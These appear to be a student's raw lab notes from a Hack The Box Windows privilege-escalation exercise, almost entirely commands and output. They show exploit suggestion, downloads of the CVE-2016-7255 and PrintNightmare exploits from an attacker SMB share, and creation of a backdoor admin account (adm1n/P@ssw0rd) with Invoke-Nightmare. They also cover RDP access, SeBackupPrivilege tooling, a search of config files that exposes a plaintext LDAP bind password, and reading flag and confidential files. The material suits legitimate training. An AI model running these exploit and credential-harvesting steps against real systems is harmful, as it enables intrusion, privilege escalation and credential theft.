GUAcgAtAFYAIAB3AGkAbABsACAAbgBvAHQAIABiAGUAIABkAGkAcwBwAGwAYQB5AGUAZAAuAA0ACgA= | base64 -d > sysinfo.txt


git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
python2.7 windows-exploit-suggester.py --update
pip install xlrd & pip install xlrd --upgrade

python2.7 windows-exploit-suggester.py --database 2024-02-06-mssb.xls --systeminfo /home/htb-ac-786011/sysinfo.txt


python2.7 windows-exploit-suggester.py --database 2024-02-06-mssb.xlsx --systeminfo /home/htb-ac-786011/sysinfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[-] could not read file using 'utf-8' encoding: 'utf8' codec can't decode byte 0xff in position 0: invalid start byte
[+] systeminfo input file read successfully (utf-16)
[*] querying database file for potential vulnerabilities
[*] comparing the 2 hotfix(es) against the 65 potential bulletins(s) with a database of 137 known exploits
[*] there are now 53 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2016 64-bit'
[*] 
[*] done

python2.7 windows-exploit-suggester.py --database 2024-02-06-mssb.xlsx --ostext 'Windows 2016 64-bit'

[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2016 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
[*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
[*]   https://github.com/theori-io/chakra-2016-11

## CVE-2016-7255

git clone https://github.com/heh3/CVE-2016-7255

sudo impacket-smbserver share -smb2support /home/htb-ac-786011/CVE-2016-7255/

copy \\10.10.14.95\share\cve-2016-7255.exe

SHELL> dir


    Directory: C:\users\Public


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        5/25/2021   8:52 PM                Documents                     
d-r---        7/16/2016   6:23 AM                Downloads                     
d-r---        7/16/2016   6:23 AM                Music                         
d-r---        7/16/2016   6:23 AM                Pictures                      
d-r---        7/16/2016   6:23 AM                Videos                        
-a----         2/6/2024   1:52 PM         135680 cve-2016-7255.exe     

.\cve-2016-7255.exe

The following OS'es are supported:
	[*] 7  - Windows 7
	[*] 81 - Windows 8.1
	[*] 10 - Windows 10 prior to build release 14393 (Anniversary Update)
	[*] 12 - Windows 2012 R2

	[*] For example:  cve-2016-7255.exe 7    -- for Windows 7

.\cve-2016-7255.exe 12

--> Failed

## CVE-2021-1675

git clone https://github.com/calebstewart/CVE-2021-1675
cd CVE-2021-1675

sudo impacket-smbserver share -smb2support /home/htb-ac-786011/CVE-2021-1675/

copy \\10.10.14.95\share\CVE-2021-1675.ps1

Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd`

xfreerdp /v:10.129.145.62 /u:adm1n /p:P@ssw0rd

C:\Windows\system32>type c:\Users\Administrator\Desktop\flag.txt
Access is denied.

icacls 'c:\Users\Administrator\Desktop\flag.txt' /grant adm1n:F

PS C:\Users\adm1n> icacls 'c:\Users\Administrator\Desktop\flag.txt' /grant adm1n:F
c:\Users\Administrator\Desktop\flag.txt: Access is denied.
Successfully processed 0 files; Failed processing 1 files

PS C:\Users\adm1n> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

git clone https://github.com/giuliano108/SeBackupPrivilege

cd SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug
SeBackupPrivilegeCmdLets.dll  
SeBackupPrivilegeUtils.dll

sudo impacket-smbserver share -smb2support /home/htb-ac-786011/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug

copy \\10.10.14.95\share\SeBackupPrivilegeCmdLets.dll
copy \\10.10.14.95\share\SeBackupPrivilegeUtils.dll

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\Users\adm1n> Get-SeBackupPrivilege
SeBackupPrivilege is disabled
PS C:\Users\adm1n> Set-SeBackupPrivilege
PS C:\Users\adm1n> Get-SeBackupPrivilege
SeBackupPrivilege is disabled

Run CMD as Administrator

c:\Users\Administrator\Desktop>type c:\Users\Administrator\Desktop\flag.txt
Ev3ry_sysadm1ns_n1ghtMare!

findstr /SIM /C:"ldapadmin" *.txt *.ini *.cfg *.config *.xml

c:\Users>findstr /SIM /C:"ldapadmin" *.txt *.ini *.cfg *.config *.xml
Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.ui\dialog_settings.xml
htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml-temp
htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.ui\dialog_settings.xml

c:\Users>type Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
<?xml version="1.0" encoding="UTF-8"?>

<connections>
  <connection id="21f81b55-9e67-4f2a-b9e7-1939d662f017" name="LDAP.inlanefreight.local" host="dc01.inlanefreight.local" port="389" encryptionMethod="NONE" authMethod="SIMPLE" bindPrincipal="ldapadmin" bindPassword="car3ful_st0rinG_cr3d$" saslRealm="" saslQop="AUTH" saslSecStrenght="HIGH" saslMutualAuth="false" krb5CredentialsConf="USE_NATIVE" krb5Config="DEFAULT" krb5ConfigFile="" krb5Realm="" krb5KdcHost="" krb5KdcPort="88" readOnly="false" timeout="30000">
    <extendedProperties>
      <extendedProperty key="ldapbrowser.baseDn"/>
      <extendedProperty key="ldapbrowser.pagedSearch" value="false"/>
      <extendedProperty key="ldapbrowser.modifyModeNoEMR" value="0"/>
      <extendedProperty key="ldapbrowser.fetchSubentries" value="false"/>
      <extendedProperty key="ldapbrowser.aliasesDereferencingMethod" value="1"/>
      <extendedProperty key="ldapbrowser.manageDsaIT" value="false"/>
      <extendedProperty key="ldapbrowser.pagedSearchScrollMode" value="true"/>
      <extendedProperty key="ldapbrowser.pagedSearchSize" value="100"/>
      <extendedProperty key="ldapbrowser.fetchOperationalAttributes" value="false"/>
      <extendedProperty key="ldapbrowser.modifyMode" value="0"/>
      <extendedProperty key="ldapbrowser.timeLimit" value="0"/>
      <extendedProperty key="ldapbrowser.fetchBaseDns" value="true"/>
      <extendedProperty key="ldapbrowser.countLimit" value="1000"/>
      <extendedProperty key="ldapbrowser.referralsHandlingMethod" value="3"/>
      <extendedProperty key="ldapbrowser.modifyOrder" value="0"/>
    </extendedProperties>
  </connection>
</connections>

c:\Users>dir /S confidential.txt
 Volume in drive C has no label.
 Volume Serial Number is 7029-F417

 Directory of c:\Users\Administrator\Music

06/07/2021  11:41 AM                32 confidential.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)  18,826,080,256 bytes free

type c:\Users\Administrator\Music\confidential.txt
5e5a7dafa79d923de3340e146318c31a